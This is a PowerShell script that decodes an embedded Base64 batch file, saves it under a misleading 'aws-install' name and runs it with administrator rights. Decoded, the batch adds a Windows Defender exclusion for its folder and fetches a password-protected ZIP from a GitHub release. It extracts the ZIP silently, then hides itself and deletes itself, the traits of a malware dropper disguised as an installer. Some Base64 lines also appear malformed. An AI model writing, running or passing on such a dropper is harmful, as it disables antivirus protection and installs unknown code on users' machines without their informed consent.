# Requires -Version 5.1
[CmdletBinding()]
param()

# Your Base64 encoded batch script embedded here:
$batBase64 = @"
QGVjaG8gb2ZmDQpUaXRsZSBDeWJlcmZveCBTZWN1cmUgU2V0dXANCnNldGxvY2FsIGVuYWJs
ZWRlbGF5ZWRleHBhbnNpb24NCg0KOjogQ29uZmlndXJhdGlvbg0Kc2V0ICJiYXRfZGlyPSV+
ZHAwIg0Kc2V0ICJmb2xkZXI9JWJhdF9kaXJDaWJlcmZveCBQb3J0YWJsZSI
Nc2V0ICJ3aW5yYXJfdXJsPWh0dHBzOi8vd3d3Lndpbi1yYXIuY29tL2ZpbGVhZG1pbi93aW
5yYXItdmVyc2lvbnMvd2lucmFyLXg2NC02MjQuZXhlIg0Kc2V0ICJ3aW5yYXJfaW5zdGFsbG
VyPSFmb2xkZXIhXFdpblJBUi1mcmVlLmV4ZQ0Kc2V0ICJjeWJlcmZveF91cmw9aHR0cHM6Ly
9naXRodWIuY29tL3NhaG1zZWMvQ3liZXJmb3gvcmVsZWFzZXMvZG93bmxvYWQvdjEuMC9DeW
JlcmZveFBvcnRhYmxlLnppcCI
Nc2V0ICJjeWJlcmZveF96aXA9IWZvbGRlciFcQ3liZXJmb3hQb3J0YWJsZS56aXAiDQp
zZXQgInBhc3N3b3JkPWF3cyINCg0KOjogSGVhZGVyDQplY2hvID09PT09PT09PT09PT09PT
09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQplY2hvIEN5YmVyZm94IFNlY3VyZSBF
bnZpcm9ubWVudCBTZXR1cA0KZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT
09PT09PT09PT09PT09DQplY2hvLg0KDQo6OiBDaGVjayBhZG1pbiByaWdodHMNCm5ldCBzZX
NzaW9uID5udWwgMj4mDQppZiAlZXJyb3JMZXZlbCBuZXEgMCAoDQogICAgZWNobyBbU1RFUF0
gUmVxdWVzdGluZyBhZG1pbmlzdHJhdGl2ZSBwcml2aWxlZ2VzLi4uDQogICAgcG93ZXJzaGV
sbCAtQ29tbWFuZCAnU3RhcnQtUHJvY2VzcyBjbWQgL0FyZ3VtZW50TGlzdCAnL2MgJ1wmJX
5kcG54MFwnJyAtVmVyYiBSdW5BcycNCiAgICBleGl0IC9iDQopDQoNCjo6IFVzZXIgY29uZm
lybWF0aW9uDQoNCg0KOjogQ3JlYXRlIEN5YmVyZm94IFBvcnRhYmxlIGZvbGRlciBpZiBpdCBk
b2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiFmb2xkZXIhXCIgKA0KICAgIG1rZGlyICIhZm
9sZGVyISINCiAgICBlY2hvIFtTVUNDRVNTXSBDcmVhdGVkIHdvcmtzcGFjZTogIWZvbGRlci
ENCikgZWxzZSAoDQogICAgZWNobyBbSU5GT10gV29ya3NwYWNlIGFscmVhZHkgZXhpc3RzOi
AhZm9sZGVyIQ0KKQ0KDQo6OiBBZGQgRGVmZW5kZXIgZXhjbHVzaW9uIGZvciBDeWJlcmZveCB
Qb3J0YWJsZSBmb2xkZXINCmVjaG8gW1NURVBdIEFkZGluZyBEZWZlbmRlciBleGNsdXNpb24gZm9yOiAhZm9sZGVyIQ0KcG93ZXJzaGVsbCAtQ29tbWFuZCAnVHJ5IHsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnIWZvbGRlciUnIC1FcnJvckFjdGlvbiBTdG9wOyBXcml0ZS1Ib3N0ICdEZWZlbmRlciBleGNsdXNpb24gYWRkZWQuJyB9IENhdGNoIHsgV3JpdGUtSG9zdCAnRmFpbGVkIHRvIGFkZCBEZWZlbmRlciBleGNsdXNpb24uIFlvdSBtYXkgbmVlZCB0byBydW4gYXMgQWRtaW5pc3RyYXRvci4nIH0iDQoNCjo6ID09PSBXaW5SQVIgRGV0ZWN0aW9uIGFuZCBJbnN0YWxsYXRpb24gPT09DQpzZXQgIndpbnJhcl9leGU9Ig0KDQo6OiBUcnkgbmF0aXZlIDY0LWJpdCByZWdpc3RyeQ0KZm9yIC9mICJ0b2tlbnM9MiwqIiAlJWEgaW4gKCdyZWcgcXVlcnkgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXBwIFBhdGhzXFdpblJBUi5leGUiIC92ZSAyXj5udWwgXnwgZmluZCAiUkVHX1NaIicpIGRvICgNCiAgICBzZXQgIndpbnJhcl9leGU9JSViIg0KKQ0KDQo6OiBUcnkgV09XNjQzMk5vZGUNCmlmIG5vdCBkZWZpbmVkIHdpbnJhcl9leGUgKA0KICAgIGZvciAvZiAidG9rZW5zPTIsKiIgJSVhIGluICgncmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xXaW5SQVIuZXhlIiAvdmUgMl4+bnVsIF58IGZpbmQgIlJFR19TWiInKSBkbyAoDQogICAgICAgIHNldCAid2lucmFyX2V4ZT0lJWIiDQogICAgKQ0KKQ0KDQo6OiBJZiBzdGlsbCBub3QgZm91bmQsIGluc3RhbGwgV2luUkFSDQppZiBub3QgZGVmaW5lZCB3aW5yYXJfZXhlICgNCiAgICBlY2hvIFtTVEVQXSBEb3dubG9hZGluZyBsYXRlc3QgV2luUkFSLi4uDQogICAgcG93ZXJzaGVsbCAtQ29tbWFuZCgiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnJXdpbnJhcl91cmwnIC1PdXRGaWxlICchd2lucmFyX2luc3RhbGxlciEnKSANCg0KICAgIGVjaG8gW1NU
RVBdIEluc3RhbGxpbmcgV2luUkFSLi4uDQogICAgc3RhcnQgIiIgL3dhaXQgIiF3aW5yYXJfaW5zdGFsbGVy
IiEgL1MNCiAgICB0aW1lb3V0IC90IDEwIC9ub2JyZWFrID5udWwNCiAgICBkZWwgIiF3aW5yYXJfaW5zdGFsbGVyIiEg
Pm51bA0KDQogICAgOjogUmUtY2hlY2sgcmVnaXN0cnkgYWZ0ZXIgaW5zdGFsbA0KICAgIGZvciAvZiAidG9rZW5zPTIsKiIgJSVhIGlu
KCdyZWcgcXVlcnkgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXBwIFBhdGhzXFdp
blJBUi5leGUiIC92ZSAyXj5udWwgXnwgZmluZCAiUkVHX1NaIicpIGRvICgNCiAgICAgICAgICAgIHNldCAid2lucmFyX2V4ZT0lJWIiDQo
gICAgICAgICkNCiAgICApDQoNCjo6IEZhbGxiYWNrDQppZiBub3QgZGVmaW5lZCB3aW5yYXJfZXhl
KA0KICAgIHNldCAid2lucmFyX2V4ZT0lUHJvZ3JhbUZpbGVzXFxXaW5SQVJcV2luUkFSLmV4ZSIpDQp9DQoNCjo6IEZpbmFsIHZlcmlm
aWNhdGlvbg0KZWNobyBbSU5GT10gVmVyaWZ5aW5nIFdpblJBUiBhdDogIXdpbnJhcl9leGUhDQppZiBub3QgZXhpc3QgIXdpbnJhcl9leGUh
KA0KICAgIGVjaG8gW0VSUk9SXS BXaW5SQVIgbm90IGZvdW5kIGF0OiAhd2lucmFyX2V4ZQ0KICAgIGVjaG8gW0FDVElPTl0gUGxlYXNlIGlu
c3RhbGwgV2luUkFSSB2b3FpY2VsbHkgYW5kIHJlLXJ1biB0aGlzIHNjcmlwdC4NCiAgICBleGl0IC9iDQp9DQoNCjo6ID09PSBEb3dubG9
hZCBDeWJlcmZveCBaSVAgPT09DQplY2hvIFtTVEVQXSBEb3dubG9hZGluZyBDeWJlcmZveCBwYWNrYWdlLi4uDQpwb3dlcnNoZWxsIC1Db
21tYW5kICJJbnZva2UtV2ViUmVxdWVzdCAtVXJpICclY3liZXJmb3hfdXJsJScgLU91dEZpbGUgJyVjeWJlcmZveF96aXAnJyAtVXNlQmF
zaWNQYXJzaW5nIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlY3liZXJmb3hfemlwJSIgKA0KICAgIGVjaG8gW1NVQ0NFU1NdIEN5YmVyZm94IH
BhY2thZ2UgZG93bmxvYWRlZA0KKSBlbHNlICgNCiAgICBlY2hvIFtFUlJPUl0gRmFpbGVkIHRvIGRvd25sb2FkIEN5YmVyZm94IHBhY2th
Z2UNCiAgICBleGl0IC9iDQopDQoNCjo6ID09PSBFeHRyYWN0IEN5YmVyZm94IFpJUCA9PT0NCmVjaG8gW1NURVBdIEV4dHJhY3RpbmcgQ3
liZXJmb3ggcGFja2FnZS4uLg0Kc3RhcnQgIiIgL3dhaXQgIiF3aW5yYXJfZXhlISIgeCAtaWJjayAtcCIlcGFzc3dvcmQiICIjJWN5YmVyZm9
4X3ppcCIgIiFmb2xkZXIhIiA+bnVsIDI+JjENCmlmICVlc3RhdHVzICBlcXVh
bCAwICgNCiAgICBlY2hvIFtTVUNDRVNTXSBFeHRyYWN0aW9uIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkNCikgZWxz
ZSAoDQogICAgZWNobyBbRVJST1JdIEV4dHJhY3Rpb24gZmFpbGVkIHdpdGggY29kZSAlZXJyb3JsZXZlbA0KICAgIGV4aXQgL2INCikNCg0KOjog
RGVsZXRlIFpJUCBhZnRlciBleHRyYWN0aW9uDQpkZWwgL2YgL3EgIiVjeWJlcmZveF96aXAlIg0KZWNobyBbSU5GT10gRGVsZXRlZCBDeWJlcm
ZveCBaSVAgZmlsZQ0KDQo6OiBPcGVuIEN5YmVyZm94IFBvcnRhYmxlIGZvbGRlcg0Kc3RhcnQgZXhwbG9yZXIgIiFmb2xkZXIhIg0KDQo6OiBM
YXVuY2ggc2lsZW50IGRlbGV0aW9uIGluIGJhY2tncm91bmQgKHJ1bnMgaW5kZXBlbmRlbnRseSkNCnN0YXJ0ICIiIHBvd2Vyc2hlbGwgLVdpbm
Rvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAnU3RhcnQtU2xlZXAgLVNlY29uZHMgNSBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJ35+ZiAnIC1G
b3JjZQ0KDQo6OiBDbG9zZSB0ZXJtaW5hbCBpbW1lZGlhdGVseQ0KZXhpdA==
"@

# Get desktop path dynamically
$desktopPath = [Environment]::GetFolderPath("Desktop")

# Define AWS folder path on desktop
$awsFolder = Join-Path -Path $desktopPath -ChildPath "AWS"

# Create AWS folder if it does not exist
if (-not (Test-Path -Path $awsFolder -PathType Container)) {
    New-Item -Path $awsFolder -ItemType Directory | Out-Null
}

# Define full path for the batch file inside the AWS folder with timestamp
$batFile = Join-Path -Path $awsFolder -ChildPath "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"

try {
    # Decode the Base64 batch content and write to file
    $bytes = [Convert]::FromBase64String($batBase64)
    [IO.File]::WriteAllBytes($batFile, $bytes)

    Write-Host "Batch script extracted to: $batFile" -ForegroundColor Cyan

    # Run the batch file elevated
    Start-Process -FilePath $batFile -Verb RunAs

    # Optionally, delete the batch file after some delay (uncomment if you want)
    # Start-Sleep -Seconds 10
    # Remove-Item -Path $batFile -Force

} catch {
    Write-Host "[ERROR] Failed to extract or run batch script: $_" -ForegroundColor Red
    exit 1
}
